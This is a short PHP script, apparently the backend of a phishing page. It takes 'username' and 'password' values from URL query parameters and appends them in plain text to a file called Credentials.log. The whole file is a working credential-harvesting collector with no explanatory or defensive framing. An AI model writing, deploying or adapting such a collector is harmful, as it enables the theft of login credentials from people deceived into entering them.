<?php
if(!empty($_GET['username'])) {
    $logfile = fopen('Credentials.log', 'a+');
    fwrite($logfile, $_GET['username']);
    fclose($logfile);
}
if(!empty($_GET['password'])) {
    $logfile = fopen('Credentials.log', 'a+');
    fwrite($logfile, $_GET['password']);
    fclose($logfile);
}
?>